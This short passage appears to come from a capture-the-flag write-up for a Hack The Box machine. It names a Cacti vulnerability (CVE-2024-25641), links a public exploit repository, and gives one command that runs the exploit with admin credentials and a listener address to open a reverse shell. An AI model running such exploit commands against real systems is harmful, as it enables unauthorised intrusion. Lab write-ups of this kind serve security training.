In the case of the cacti web page, i was able to find the following resources, from which i was able to get a reverse shell into the computer. 

- https://nvd.nist.gov/vuln/detail/CVE-2024-25641
- https://github.com/Safarchand/CVE-2024-25641

By inputing the following commands, we get the reverse shell:  

```bash
$ python3 exploit.py --url http://cacti.monitorsthree.htb -u admin -p greencacti2001 -i 10.10.16.39 -l 6666
```

From here on, we have access to the [[computer]]